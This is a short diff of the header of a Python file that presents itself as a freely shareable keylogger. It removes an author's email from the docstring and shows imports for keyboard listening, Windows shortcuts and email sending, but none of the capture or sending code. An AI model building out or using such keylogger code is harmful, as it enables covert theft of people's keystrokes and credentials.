@@ -1,5 +1,4 @@
-"""This keylogger was created by Edinson Requena. Feel free to modify, download or copy it. use it for good <3
-requenasoftware@gmail.com """
+""" This keylogger was created by Edinson Requena. Feel free to modify, download or copy it. use it for good <3 """
 
 from pynput.keyboard import Key, Listener
 import os, shutil, datetime, winshell, tempfile, smtplib
